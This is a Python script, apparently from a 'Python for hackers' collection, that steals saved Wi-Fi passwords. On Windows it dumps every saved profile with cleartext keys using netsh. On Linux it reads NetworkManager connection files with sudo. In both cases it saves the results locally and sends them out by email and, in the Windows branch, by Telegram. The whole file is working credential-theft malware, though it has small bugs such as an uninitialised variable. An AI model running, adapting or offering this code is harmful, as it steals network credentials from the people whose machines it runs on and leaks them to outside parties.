#!/usr/bin/python

import os
import subprocess
import platform
import re
from sendEmail import sendMail
from sendTelegramMessage import sendTelegramMessage

# system information
system = platform.uname()
global node
node = system.node
release = system.release


class StealSavedWifiPassword():
    def __init__(self):

        self.banner(system.system)
        self.getSystemInformation()

    def getSystemInformation(self):
        if system.system == "Linux":
            self.linuxSysSteal()

        elif system.system == "Windows":
            self.windowsSysSteal()

    def windowsSysSteal(self):
        try:
            command = "netsh wlan show profile"
            networks = subprocess.check_output(command, shell=True)
            network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

            for network in network_list:
                command2 = "netsh wlan show profile " + network + " key=clear"
                one_network_result = subprocess.check_output(
                    command2, shell=True)
                output += one_network_result

            subject = f"Node: {node} Release: {release} (Steal Saved Wifi Password)"
            message = f"Node: {node} Release: {release} Output\n: {str(output)}"

            # saving passwords to a file
            file = open("wifi_password.txt", "w")
            file.write(str(output))
            file.close()

            # send passwords by mail
            sendMail(subject, str(message.encode('utf-8').strip()))

            # send telegram message
            sendTelegramMessage(node, release, str(output))
        except KeyboardInterrupt:
            print("\n[~] End: You have pressed ctrl-c button.")

    def linuxSysSteal(self):
        try:
            output = os.popen(
                "sudo cat /etc/NetworkManager/system-connections/*").read()
            subject = f"Node: {node} Release: {release} (Steal Saved Wifi Password)"
            message = f"Node: {node} Release: {release} Output\n: {str(output)}"

            # saving passwords to a file
            file = open("wifi_password.txt", "w")
            file.write(str(output))
            file.close()

            # send passwords by mail
            sendMail(subject, str(message.encode('utf-8').strip()))

            # send telegram message
            #sendTelegramMessage(node, release, str(output))
        except PermissionError:
            print("Permission denied! " + PermissionError)
        except KeyboardInterrupt:
            print("\n[~] End: You have pressed ctrl-c button.")

    def banner(self, system):
        print("""
        █▀█ █▄█ ▀█▀ █░█ █▀█ █▄░█   █▀▀ █▀█ █▀█   █░█ █░█ █▀▀ █▄▀ █▀█ █▀
        █▀▀ ░█░ ░█░ █▀█ █▄█ █░▀█   █▀░ █▄█ █▀▄   █▀█ ▀▀█ █▄▄ █░█ █▀▄ ▄█

                                                𝖌𝖎𝖙𝖍𝖚𝖇 𝖆𝖑𝖎𝖎76𝖙𝖙
        """)
        print("-"*50)
        print(
            f"𝑺𝒕𝒆𝒂𝒍 𝑺𝒂𝒗𝒆𝒅 𝑾𝒊𝒇𝒊 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅\n--> System: {system.upper()} <--\n".center(50))


if __name__ == "__main__":
    StealSavedWifiPassword()
